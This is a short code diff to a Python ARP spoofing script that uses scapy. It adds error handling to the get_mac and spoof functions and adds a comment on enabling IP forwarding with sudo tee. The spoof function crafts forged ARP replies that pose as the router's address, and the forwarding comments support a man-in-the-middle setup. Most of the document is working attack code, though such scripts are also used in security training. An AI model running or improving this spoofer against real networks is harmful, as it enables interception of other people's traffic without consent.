@@ -2,6 +2,7 @@
 # echo 1 > /proc/sys/net/ipv4/ip_forward
 # to deactivate the ip forwarding
 # echo 0 > /proc/sys/net/ipv4/ip_forward
+# or echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward if you get permission denied error
 # to see the ip forwarding status
 # cat /proc/sys/net/ipv4/ip_forward
 # ---------------------------------------------------------------------------------------------------------------------
@@ -42,7 +43,11 @@ def get_mac(ip):
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     combined_packet = broadcast / arp_request
     answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
-    return answered_list[0][1].hwsrc
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        print(f"[-] No response received for IP: {ip}")
+        return None
 
 
 def spoof(target_ip, spoof_ip):
@@ -51,6 +56,9 @@ def spoof(target_ip, spoof_ip):
     # pdst is the target ip address
     # hwdst is the target mac address
     # psrc is the source ip address which I set to router ip address
+    if target_mac is None:
+        print(f"[-] Could not find MAC address for IP: {target_ip}. Skipping...")
+        return
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
